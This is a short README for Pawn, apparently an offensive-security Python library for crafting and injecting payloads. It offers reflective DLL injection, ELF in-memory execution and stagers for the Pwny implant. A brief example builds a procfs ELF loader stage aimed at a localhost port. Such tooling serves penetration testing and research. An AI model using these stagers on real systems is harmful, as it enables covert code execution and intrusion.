# Pawn

Pawn is a collection of Python techniques used for crafting, manipulating and injecting payloads.

## Features

* Support for `Windows`, `macOS`, `Linux` and `Apple iOS`.
* Support for such techniques like `Reflective DLL Injection` and `ELF in-memory execution`.
* Can generate stage0, stage1 and dynamic extensions for Pwny.

## Installation

```
pip3 install git+https://github.com/EntySec/Pawn
```

## Examples

Example of using ELF in-memory loader (using procfs technique [described here](https://entysec.github.io/2023-04-02-remote-elf-loading/)).

```python
from pawn.linux.x64 import Loader

loader = Loader()

stage = loader.procfs_loader(
    host='127.0.0.1',
    port=8888,
)

print(len(stage))
```

## Special Thanks

* Some parts of **Windows assembly code** were ported from free open-source project [Metasploit Framework](https://github.com/rapid7/metasploit-framework).
